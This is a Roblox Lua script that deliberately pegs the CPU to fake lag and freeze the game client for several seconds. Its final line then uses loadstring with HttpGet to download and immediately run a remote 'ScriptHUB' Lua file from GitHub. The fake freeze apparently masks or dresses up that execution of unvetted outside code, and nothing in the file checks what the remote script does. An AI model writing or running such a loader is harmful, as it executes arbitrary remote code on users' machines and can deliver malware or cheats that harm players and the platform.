-- ============================================================
-- FAKE LAG + FREEZE SCRIPT
-- Sequence: Freeze 6s → Lag 3s → Execute payload
-- ============================================================

-- === Stage 1: Start lagging immediately (heavy CPU) ===
-- This runs in a separate thread so the main script doesn't block.
task.spawn(function()
    local counter = 0
    while true do
        -- Heavy math to spike CPU usage
        for i = 1, 10000 do
            counter = counter + math.sin(i) * math.cos(i)
        end
        -- Yield a tiny bit to keep the thread alive, but still heavy
        task.wait(0)
    end
end)

-- === Stage 2: Wait 1.5s then Freeze for 6 seconds ===
task.wait(1.5)  -- let lag sink in

-- Freeze the client by occupying the main thread with a busy loop
print("FREEZING for 6 seconds...")
local freezeStart = tick()
while tick() - freezeStart < 6 do
    -- This loop will consume 100% CPU on one thread, causing a noticeable freeze
    -- No yield inside = thread blocked = client stalls
    local dummy = 0
    for i = 1, 1e7 do
        dummy = dummy + i
    end
end
print("Freeze ended.")

-- === Stage 3: Lag for 3 seconds ===
print("Lagging for 3 seconds...")
local lagStart = tick()
while tick() - lagStart < 3 do
    -- Same heavy operation but with a small yield to keep responsiveness low
    for i = 1, 10000 do
        local _ = math.sin(i) * math.cos(i)
    end
    task.wait()  -- short yield to avoid freezing completely
end
print("Lag ended.")

-- === Stage 4: Execute payload ===
print("Executing external script...")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kryptrix-hub12/ScriptHUB/refs/heads/main/All%20in%20one%20Public.lua"))()
